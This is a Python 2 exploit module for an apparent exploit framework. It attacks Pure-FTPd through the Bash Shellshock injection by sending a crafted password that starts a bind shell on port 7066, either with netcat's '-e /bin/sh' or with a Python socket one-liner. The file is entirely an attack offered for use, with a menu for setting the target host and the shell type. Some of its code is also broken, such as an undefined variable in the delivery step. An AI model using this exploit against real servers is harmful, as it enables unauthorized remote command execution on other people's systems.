import os, sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
import core
class pureftpdBashInjectionMenu(core.Exploit):
    def generate(self, p):
        if self.variables["shell"] == "nc":
            shell = "nc -lp 7066 -e /bin/sh &"
        elif self.variables["shell"] == "python":
            shell = "python -c 'import os, subprocess; from socket import *; s = socket(AF_INET, SOCK_STREAM); s.bind((\"localhost\", 7066)); s.listen(5); client, addr = s.accept(); os.dup2(client.fileno(), 0); os.dup2(client.fileno(), 1); os.dup2(client.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"])' &"
        else:
            print "*** Shell variable must be 'nc' or 'python'."
            return
        p = "() { :;}; %s/sh -c %s" % (self.variables["rpath"], shell)
        user = self.rand_text(20)
        return (p, user)
    def deliver(self, p):
        s = self.connect()
        s.send("USER " + user)
        s.recv(1024)
        s.send("PASS " + p)
        s.recv(1024)
        self.disconnect(s)
def main(s):
  pureftpdbashinjectionmenu = pureftpdBashInjectionMenu("pureftpd_bash_injection", "Linux x86 and x64", "", {"host":"", "rpath":"/bin", "shell":""}, {"host":"the IP of the target", "rpath":"the remote path utilities (sh, ps, etc.) are in", "shell":"(nc/python) the type of shell to spawn"})
  pureftpdbashinjectionmenu.cmdloop()
if __name__ == '__main__':
  main("")
